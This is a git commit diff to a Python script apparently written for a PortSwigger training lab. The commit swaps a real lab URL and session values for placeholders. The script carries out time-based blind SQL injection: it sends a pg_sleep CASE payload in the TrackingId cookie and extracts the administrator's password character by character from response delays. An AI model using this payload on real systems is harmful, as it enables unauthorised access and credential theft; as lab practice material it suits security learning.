1c2a9f908202cb8ce380add4f1a88f6be85f56e2
Khalid emad <58134995+khaled1000emad@users.noreply.github.com>
2022-05-06 08:55:14 +0200

    Update lab14-script.py

--- PortSwigger/Blind SQL Injection/lab14-script.py
+++ PortSwigger/Blind SQL Injection/lab14-script.py
@@ -1,17 +1,17 @@
 import requests
 import string
 
-url="https://ac731fbc1f60076dc02824a2009e00b7.web-security-academy.net/"
+url="YOUR_LAB_URL"
 password=""
 chars = string.ascii_lowercase+string.digits
 counter = 1
-sql_payload = "'||(SELECT+CASE+WHEN((select+substring(password,9,1)+from+users+where+username='administrator')='1')+THEN+pg_sleep(5)+ELSE+pg_sleep(-1)+END+FROM+users)||'"
+#sql_payload = "'||(SELECT+CASE+WHEN((select+substring(password,9,1)+from+users+where+username='administrator')='1')+THEN+pg_sleep(5)+ELSE+pg_sleep(-1)+END+FROM+users)||'"
 
 while True:
     for char in chars:
             r = requests.get(url, cookies={
-                "TrackingId":f"qrVUOEJN3mojr9RU'||(SELECT+CASE+WHEN((select+substring(password,{counter},1)+from+users+where+username='administrator')='{char}')+THEN+pg_sleep(5)+ELSE+pg_sleep(-1)+END+FROM+users)||'",
-                "session":"Px736EEFUItNgDqG66YldjJsGuuTWsVY"
+                "TrackingId":f"YOUR_TRACKING_ID'||(SELECT+CASE+WHEN((select+substring(password,{counter},1)+from+users+where+username='administrator')='{char}')+THEN+pg_sleep(5)+ELSE+pg_sleep(-1)+END+FROM+users)||'",
+                "session":"YOUR_SESSION_ID"
             })
             if(int(r.elapsed.total_seconds()) >= 10): # Calculating the response time 
                 password+=char
